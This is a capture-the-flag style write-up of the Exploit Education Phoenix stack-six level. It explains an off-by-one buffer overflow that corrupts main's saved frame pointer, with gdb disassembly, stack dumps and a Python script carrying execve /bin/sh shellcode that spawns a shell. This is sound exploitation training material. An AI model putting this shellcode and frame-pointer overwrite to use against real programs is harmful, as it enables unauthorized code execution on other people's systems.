<h3 style="text-align:center" dir="rtl">بسم الله الرحمن الرحيم </h3>

# Stack Six:
In this level we need to execute a shellcode to spawn a shell. However, its different from stack five level in we can not overwrite the return address from `greet` function because of the if-statment in `greet` .

<br/>

Lets see what happen in `greet` function. This function takes as argument a pointer to char named `who` and return a string (pointer to char).
1. `who` pointer is the pointer that points to the env variable `ExploitEducation`.
2. `buffer` array of size 128 is defined.
3. `maxSize` integer  is defined.
4. `who` array length is calculated and stored in `maxSize`.
5. If `maxSize` is bigger than `buffer` go to line 6 else go to line 7.
6. `Buffer` length is calcualted and subtracted by 1 because the index start from 0 and `strlen` return lastIndex + 1.
7. `what` var is a global variable that takes its value from the macro `GREET` that changes based on the system arch.`what` variable is copied to the `buffer`.In amd64 levels `what` is `Welcome, I am pleased to meet you `.`what` string length is 34(space included).
8. `strncpy` used to ensure that the copy from `who` to the `buffer` is in range of `maxSize` integer.This operation will only copy a maximum of 127 character from `who` to `buffer`. 
9. `strdup` duplicate the `buffer` and store it in heap and return a pointer to that location. The reason to use `strdup` because it stores the string in heap which will not be affected by the destruction of the stack frame of `greet` function.

<br/>

The thing we need to focus on is the copy of `what` and `who` to buffer.
```
strlen(what) = 34
strlen(buffer) = 128 free
"what" copied to "buffer".
The remaining space in buffer = 128 - 34 = 94
maximum allowed size of "who" is 127.
127 copied to buffer.
127 > 94 then the buffer will overwite more than the allowed space for it.
The size of the overflow is 33 byte.
```



### Reversing The Program :
Disassemble `greet` function :
```bash
(gdb) disas greet
Dump of assembler code for function greet:
   0x00000000004006fd <+0>:	push   rbp
   0x00000000004006fe <+1>:	mov    rbp,rsp
   0x0000000000400701 <+4>:	push   rbx
   0x0000000000400702 <+5>:	sub    rsp,0xa8
                    .
                    .
  <.........................................>
   0x0000000000400791 <+148>:	add    rsp,0xa8
   0x0000000000400798 <+155>:	pop    rbx
   0x0000000000400799 <+156>:	pop    rbp
   0x000000000040079a <+157>:	ret    
End of assembler dump.

```
<br>

- Stack layout after `greet+5` :
```md

168 byte subtracted from RSP to make space for local variables and temp variables.
128 bytes for `buffer`.8 bytes for `who` pointer.4 bytes for `maxSize`.The remaining 18 bytes I don't know for what. :) 
_____________________
previous value of RBX register
______________________
previous frame pointer `main`
______________________
return address to main 
```

- At `greet+148` will remove the space for local and temp vars.
- At `greet+155` will restore the previous value of `RBX`
- At `greet+156` will retsore the previous frame pointer to `RBP`
- At `greet+157` will move the return address to `RIP` to continue in `main` function.

<br\>

- Lets consider what will happen when `greet` finish execution and return execution in `main` function : 
1. After popping the return address from stack to `RIP` the program will continue execution in `main`.
2. Program execute `leave` instruction.It will copy the `RBP` register to `RSP` and then restore the old `RBP` from the stack.
```assembly
mov   rsp, rbp     # esp = ebp,  mov  esp,ebp in Intel syntax
pop   rbp
```
3. After the `leave` instruction the top of the stack is pointing to the return address after `main` function.The `ret` instruction will pop that value to `RIP` and complete the execution.

<br/\>

The Reason I explained this is because of the limitation of what can be overwitten.

## Exploit The Program:
First lets see what we can overwrite.
```bash
export ExploitEducation=$(python -c "print('A'*127)")
gdb
(gdb)file stack-six
(gdb)disas greet
<-------------------------->
0x0000000000400791 <+148>:	add    rsp,0xa8
0x0000000000400798 <+155>:	pop    rbx
0x0000000000400799 <+156>:	pop    rbp
0x000000000040079a <+157>:	ret

(gdb)b *greet+148
Breakpoint 1 at 0x400791
(gdb)disas main
<------------------------->
0x00000000004007f6 <+91>:	leave  
0x00000000004007f7 <+92>:	ret    
(gdb)b *main+91
Breakpoint 2 at 0x4007f6
(gdb)run
→   0x400791 <greet+148>      add    rsp, 0xa8
(gdb)x/24gx $rsp
0x7fffffffe3b0:	0x00007ffff7ffc948	0x00007fffffffeede
0x7fffffffe3c0:	0x2c656d6f636c6557	0x6c70206d61204920
0x7fffffffe3d0:	0x6f74206465736165	0x6f79207465656d20
0x7fffffffe3e0:	0x4141414141412075	0x4141414141414141
0x7fffffffe3f0:	0x4141414141414141	0x4141414141414141
0x7fffffffe400:	0x4141414141414141	0x4141414141414141
0x7fffffffe410:	0x4141414141414141	0x4141414141414141
0x7fffffffe420:	0x4141414141414141	0x4141414141414141
0x7fffffffe430:	0x4141414141414141	0x4141414141414141
0x7fffffffe440:	0x4141414141414141	0x4141414141414141
0x7fffffffe450:	0x4141414141414141	0x4141414141414141
0x7fffffffe460:	0x00007fffffffe441	0x00000000004007e9
```
The first 8-bytes at address `0x7fffffffe460` is the `RBP` of `main` function which is overwritten by 1 byte.The second 8-bytes are the return address to `main`.Lets continue the execution.
```bash
(gdb)c
→   0x4007f7 <main+91>        leave
(gdb)p $rbp
$3 = (void *) 0x7fffffffe441
(gdb)p $rsp
$4 = (void *) 0x7fffffffe470
(gdb)ni
→   0x4007f7 <main+92>        ret
(gdb)p $rbp
$5 = (void *) 0x3400007ffff7ffb3
(gdb)p $rsp
$6 = (void *) 0x7fffffffe449
(gdb) x/wx $rsp
0x7fffffffe449:	0xfff7db99
(gdb)n
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x4100007ffff7db99
(gdb)p $rip
$9 = (void (*)()) 0x4100007ffff7db99
```
Now I think we controlled the exection of the program to other place.The `RBP` of `main` function was modified in `greet` and when executing `leave` instruction at `main` it copied the value of `RBP=0x7fffffffe441` to `RSP` then popped 8-bytes pointed by `RSP` to `RBP`.Now the top of the stack if the return address after `main` which was controlled by us.`RET` instruction will pop this to `RIP` and continue execution.

<br\>

Now lets find a place in stack that is pointing to the `ExploitEducation` environment variable.Run the program again.
```bash
(gdb)run
→   0x400791 <greet+148>      add    rsp, 0xa8
() x/50gx $rsp
0x7fffffffe3b0:	0x00007ffff7ffc948	0x00007fffffffeede
0x7fffffffe3c0:	0x2c656d6f636c6557	0x6c70206d61204920
0x7fffffffe3d0:	0x6f74206465736165	0x6f79207465656d20
0x7fffffffe3e0:	0x4141414141412075	0x4141414141414141
0x7fffffffe3f0:	0x4141414141414141	0x4141414141414141
0x7fffffffe400:	0x4141414141414141	0x4141414141414141
0x7fffffffe410:	0x4141414141414141	0x4141414141414141
0x7fffffffe420:	0x4141414141414141	0x4141414141414141
0x7fffffffe430:	0x4141414141414141	0x4141414141414141
0x7fffffffe440:	0x4141414141414141	0x4141414141414141
0x7fffffffe450:	0x4141414141414141	0x4141414141414141
0x7fffffffe460:	0x00007fffffffe441	0x00000000004007e9
0x7fffffffe470:	0x00007fffffffe4e8	0x00000001ffffe4f8
0x7fffffffe480:	0x000000000040079b	0x00007fffffffeede
0x7fffffffe490:	0x0000000000000001	0x00007ffff7d8fd62
0x7fffffffe4a0:	0x0000000000000000	0x00007fffffffe4e0
0x7fffffffe4b0:	0x0000000000000000	0x00007ffff7ffdbc8
0x7fffffffe4c0:	0x0400000100003e00	0x00000000004005c9
0x7fffffffe4d0:	0x0000000000000000	0x00000000004005a6
0x7fffffffe4e0:	0x0000000000000001	0x00007fffffffe739
0x7fffffffe4f0:	0x0000000000000000	0x00007fffffffe756
0x7fffffffe500:	0x00007fffffffed12	0x00007fffffffed2d
0x7fffffffe510:	0x00007fffffffed58	0x00007fffffffed6d
0x7fffffffe520:	0x00007fffffffed85	0x00007fffffffed9a
0x7fffffffe530:	0x00007fffffffedab	0x00007fffffffedbd
(gdb)x/s 0x00007fffffffeede
0x7fffffffeede:	'A' <repeats 127 times>
```
This address is the address of our env variable.This pointer is located at `0x7fffffffe3b8`.
```bash
(gdb)x/gx 0x00007fffffffe488
0x7fffffffe488:	0x00007fffffffeede
```
Now put the shellcode in `ExploitEducation` and make sure to overwrite the last byte of main function `RSP` to 8-bytes before `0x7fffffffe488` because the `leave` will move the first 8-bytes at `RSP` then pop the value at top of stack to `RBP` then `RET` will pop the value at top of sttack which is the return address we have controll of `0x00007fffffffeede` to `RIP` finally the shellcode will be executed.

<br>


```python
#!/bin/python
padding = 'A'* 99
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
#shellcode length is 27.We have 100 bytes remaining we will use the last character to overwrite the RBP
print shellcode + padding + '\x80'
```
Execute the program after editing `ExploitEducation`.

```bash
(gdb) run
Starting program: /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you 1�H�ѝ��Ќ��H��ST_�RWT^�;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����
process 382 is executing new program: /bin/dash
warning: Could not load shared library symbols for linux-vdso.so.1.
Do you need "set solib-search-path" or "set sysroot"?
$ who
[Detaching after fork from child process 389]
user     pts/0        Dec 27 17:59 (10.0.2.2)
```
### Notes
- To make the exploit work in gdb and out of it make sure that the env variables in gdb is the same as out of gdb.GDB add extra env variables to unset them use `unset env VARIABLE_NAME`